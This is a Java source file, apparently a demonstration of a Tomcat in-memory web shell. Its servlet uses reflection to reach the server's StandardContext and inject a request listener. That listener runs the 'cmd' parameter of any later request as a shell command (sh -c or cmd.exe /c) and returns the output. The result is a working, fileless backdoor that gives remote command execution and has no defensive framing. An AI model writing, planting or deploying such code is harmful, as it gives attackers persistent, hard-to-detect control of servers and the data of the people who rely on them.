package com.example.tomcatmemshelldemo;

import org.apache.catalina.connector.Request;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;

import javax.servlet.*;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.util.Scanner;

@WebServlet("/testListenerServlet")
public class TestListenerServlet extends HttpServlet {
    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        final String name = "test_listener";

        try {
            ServletContext servletContext = request.getSession().getServletContext();
            Field appctx = servletContext.getClass().getDeclaredField("context");
            appctx.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

            Field stdctx = applicationContext.getClass().getDeclaredField("context");
            stdctx.setAccessible(true);
            StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

            ServletRequestListener listener = new ServletRequestListener() {
                @Override
                public void requestDestroyed(ServletRequestEvent sre) {
                    HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
                    if (req.getParameter("cmd") != null) {
                        boolean isLinux = true;
                        String osTyp = System.getProperty("os.name");
                        if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                            isLinux = false;
                        }
                        String[] cmds = isLinux ? new String[]{"sh", "-c", req.getParameter("cmd")} : new String[]{"cmd.exe", "/c", req.getParameter("cmd")};
                        try {
                            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                            Scanner s = new Scanner(in).useDelimiter("\\A");
                            String output = s.hasNext() ? s.next() : "";
                            Field requestF = req.getClass().getDeclaredField("request");
                            requestF.setAccessible(true);
                            Request request1 = (Request) requestF.get(req);
                            PrintWriter out = request1.getResponse().getWriter();
                            out.println(output);
                            out.flush();
                            out.close();
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                }

                @Override
                public void requestInitialized(ServletRequestEvent sre) {

                }
            };
            standardContext.addApplicationEventListener(listener);
            response.getWriter().write("Success");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}